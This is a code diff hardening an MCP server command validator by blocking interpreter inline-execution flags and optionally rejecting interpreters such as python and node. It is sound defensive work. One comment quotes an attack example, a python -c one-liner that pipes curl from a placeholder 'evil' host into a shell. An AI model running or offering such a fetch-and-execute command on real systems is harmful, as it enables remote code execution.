@@ -78,6 +78,49 @@ DANGEROUS_ARG_PATTERNS: list[re.Pattern] = [
     re.compile(r"<\s*/"),  # Read from absolute path
 ]
 
+_TRUTHY = frozenset({"1", "true", "yes", "on"})
+
+
+def _env_truthy(name: str) -> bool:
+    return os.environ.get(name, "").strip().lower() in _TRUTHY
+
+
+# S-5 (#0907 audit): inline-execution flags let a whitelisted interpreter
+# (python/node/npx) run arbitrary code passed as an argument —
+# `python -c "import os;os.system('curl evil|sh')"` or `node -e "..."`.
+# The regex denylist below would not catch a payload that avoids
+# `;`/`|`/`$()`/backticks (e.g. via getattr/chr obfuscation), so block the
+# flag itself, not the payload. Both bare (`-c`) and `=`-attached
+# (`--eval=code`) forms are blocked.
+INTERPRETER_INLINE_EXEC_FLAGS: frozenset[str] = frozenset(
+    {
+        "-c",
+        "-e",
+        "--eval",
+        "--exec",
+        "--exec-file",
+    }
+)
+
+# S-5 (#0907 audit): general-purpose interpreters are inherently able to run
+# arbitrary code. They stay in the default whitelist because official MCP
+# servers launch via npx/node, but an operator who wants maximum strictness
+# can set FUSION_MCP_DISALLOW_INTERPRETERS=true to drop them entirely (then
+# only the dedicated mcp-server-* binaries + docker remain accepted).
+INTERPRETER_COMMANDS: frozenset[str] = frozenset(
+    {
+        "npx",
+        "npm",
+        "node",
+        "uvx",
+        "uv",
+        "python",
+        "python3",
+        "pip",
+        "pipx",
+    }
+)
+
 
 class MCPSecurityError(Exception):
     """Raised when MCP security validation fails."""
@@ -153,6 +196,30 @@ class MCPCommandValidator:
         # Extract base command name (without path)
         base_command = Path(command).name
 
+        # S-5 (#0907 audit): an operator who wants maximum strictness can
+        # set FUSION_MCP_DISALLOW_INTERPRETERS=true to drop general-purpose
+        # interpreters (python/node/npx/uvx/...) from acceptance entirely,
+        # leaving only the dedicated mcp-server-* binaries + docker. Without
+        # this env var interpreters remain accepted (official MCP servers
+        # launch via npx/node) but inline-exec flags are still blocked in
+        # validate_args.
+        if _env_truthy("FUSION_MCP_DISALLOW_INTERPRETERS"):
+            interp = base_command
+            if re.match(r"^python3\.\d+$", base_command):
+                interp = "python3"
+            if interp in INTERPRETER_COMMANDS:
+                logger.warning(
+                    f"MCP server '{server_name}': interpreter command "
+                    f"'{base_command}' rejected — "
+                    f"FUSION_MCP_DISALLOW_INTERPRETERS=true (S-5)"
+                )
+                raise MCPSecurityError(
+                    f"MCP server '{server_name}': Interpreter command "
+                    f"'{base_command}' is not allowed because "
+                    f"FUSION_MCP_DISALLOW_INTERPRETERS is set. Use a "
+                    f"dedicated mcp-server-* binary or unset the env var."
+                )
+
         # Versioned-python alias: real interpreters ship as python3.12 /
         # python3.13 etc. but the whitelist only carries the stable names
         # python / python3. Treat python3.NN as python3 so a venv interpreter
@@ -215,6 +282,21 @@ class MCPCommandValidator:
             return
 
         for i, arg in enumerate(args):
+            # S-5 (#0907 audit): block interpreter inline-exec flags
+            # (`-c`/`-e`/`--eval`/`--exec`) outright. A whitelisted
+            # interpreter like `python` can run arbitrary code via these
+            # flags, and the regex denylist cannot reliably catch an
+            # obfuscated payload (getattr/chr/etc. avoid `;`/`|`/`$()`).
+            # Match the flag token itself, or its `=`-attached form
+            # (`--eval=code` → bare flag `--eval`).
+            bare_flag = arg.split("=", 1)[0] if arg.startswith("--") else arg
+            if bare_flag in INTERPRETER_INLINE_EXEC_FLAGS:
+                raise MCPSecurityError(
+                    f"MCP server '{server_name}': Argument {i} is an "
+                    f"interpreter inline-execution flag '{arg}'. "
+                    f"Running arbitrary code via a whitelisted interpreter "
+                    f"is blocked (S-5)."
+                )
             for pattern in DANGEROUS_ARG_PATTERNS:
                 if pattern.search(arg):
                     raise MCPSecurityError(
